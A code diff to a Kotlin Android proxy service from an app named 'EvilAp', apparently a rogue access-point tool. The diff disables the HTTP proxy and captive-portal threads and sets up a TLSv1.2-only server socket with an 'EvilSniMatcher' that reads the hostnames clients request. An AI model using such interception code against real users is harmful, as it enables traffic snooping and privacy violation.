@@ -17,7 +17,6 @@ import java.io.IOException
 import java.net.ServerSocket
 import javax.net.ssl.SSLContext
 import javax.net.ssl.SSLServerSocket
-import javax.net.ssl.SSLSocket
 
 class ProxyService : Service(){
     /**************************************CLASS FIELDS********************************************/
@@ -47,14 +46,14 @@ class ProxyService : Service(){
             e.printStackTrace()
         }
         //start the HTTP proxy socket thread
-        val proxyHTTP = Thread(MainLoopProxy(mSocketHTTP, EvilApApp.instance.PORT_PROXY_HTTP))
-        proxyHTTP.start()
+        //val proxyHTTP = Thread(MainLoopProxy(mSocketHTTP, EvilApApp.instance.PORT_PROXY_HTTP))
+        //proxyHTTP.start()
         //start the HTTPS proxy socket thread
         val proxyHTTPS = Thread(MainLoopProxy(mSocketHTTPS, EvilApApp.instance.PORT_PROXY_HTTPS))
         proxyHTTPS.start()
         //start the captive portal thread
-        val portal = Thread(MainLoopCaptivePortal(mSocketPortal))
-        portal.start()
+        //val portal = Thread(MainLoopCaptivePortal(mSocketPortal))
+        //portal.start()
     }
 
     override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
@@ -95,7 +94,14 @@ class ProxyService : Service(){
         //sc.init(null, null, null)
         val ssf = sc.serverSocketFactory
         val sock = ssf.createServerSocket() as SSLServerSocket
-        //sock.sslParameters.sniMatchers = listOf(EvilSniMatcher())
+        sock.useClientMode = false
+        // Use only TLSv1.2 to get access to ExtendedSSLSession
+        // https://docs.oracle.com/javase/8/docs/technotes/guides/security/jsse/JSSERefGuide.html#SSLSession
+        val params = sock.sslParameters
+        params.protocols = arrayOf("TLSv1.2")
+        params.sniMatchers = listOf(EvilSniMatcher())
+        sock.sslParameters = params
+        sock.enabledProtocols = arrayOf("TLSv1.2")
         return sock
     }
 
